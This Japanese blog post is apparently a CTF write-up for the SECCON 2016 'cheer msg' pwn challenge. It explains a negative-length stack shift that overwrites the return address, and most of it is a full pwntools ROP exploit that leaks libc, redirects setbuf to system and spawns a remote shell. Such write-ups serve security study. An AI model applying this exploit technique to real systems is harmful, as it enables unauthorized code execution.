---
layout: post
alias: "/blog/2016/12/16/seccon-2016-online-cheermsg/"
date: "2016-12-16T21:02:05+09:00"
tags: [ "ctf", "writeup", "pwn", "rop" ]
"target_url": [ "https://score-quals.seccon.jp/question/3093a2f4584782e888feb5cf243d982dd3211e2b" ]
---

# SECCON 2016 Online CTF: cheer msg

本番でやりかけたら影白さんが先に解いてくれてそのままになってた。
なのでpwn会で解いた。後輩らが村人Bで苦しんでるのを眺めながら解いて$3$時間かかった。もうちょっと速くしたい。

## problem

$32$bit。入力が$3$箇所。

``` sh
$ ./cheer_msg
Hello, I'm Nao.
Give me your cheering messages :)

Message Length >> 8  
Message >> Hello

Oops! I forgot to ask your name...
Can you tell me your name?

Name >> Yu

Thank you Yu!
Message : Hello
```

## solution

Message Lengthに指定した量だけ`main`関数内のlocal変数として領域が確保され、`message`関数内でこれに読み書きがされる。
ここで負数を指定するとMessage部分での読み込みは行われなくなるが、stackがずれることにより、Nameの読み込みで戻り先addressを書き換えることができる。
$-144$を指定するとちょうどNameの先頭に戻り先addressが来る。

後は適当にROP。`SECCON{N40.T_15_ju571c3}`。

## implementation

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='cheermsg.pwn.seccon.jp')
parser.add_argument('port', nargs='?', default=30527, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--libc', default='libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368')
args = parser.parse_args()
context.log_level = args.log_level

elf = ELF('./cheer_msg')
libc = ELF(args.libc)
bss = 0x804a040
buf = bss + 0x300
thankyou = 0x804887e # "Thank you %s!\n"
pop_pop_ret = 0x080487ae # pop edi ; pop ebp ; ret

payload = ''
payload += p32(elf.plt['printf'])
payload += p32(pop_pop_ret)
payload += p32(thankyou)
payload += p32(elf.got['setbuf'])
payload += p32(elf.symbols['getnline'])
payload += p32(pop_pop_ret)
payload += p32(elf.got['setbuf'])
payload += p32(100)
payload += p32(elf.symbols['getnline'])
payload += p32(pop_pop_ret)
payload += p32(buf)
payload += p32(100)
payload += p32(elf.plt['setbuf'])
payload += 'CCCC'
payload += p32(buf)

p = remote(args.host, args.port)
p.recvuntil('Message Length >> ')
p.sendline('-144')
p.recvuntil('Message >> ')
p.recvuntil('Name >> ')
p.sendline(payload)
p.recvuntil('Thank you ')
p.recvuntil('Thank you ')
setbuf = u32(p.recv(4))
system = setbuf - libc.symbols['setbuf'] + libc.symbols['system']
log.info('setbuf: %#x', setbuf)
log.info('system: %#x', system)
time.sleep(0.3)
p.sendline(p32(system))
time.sleep(0.3)
p.sendline('/bin/sh\0')
time.sleep(1)
p.sendline('id')
p.interactive()
```
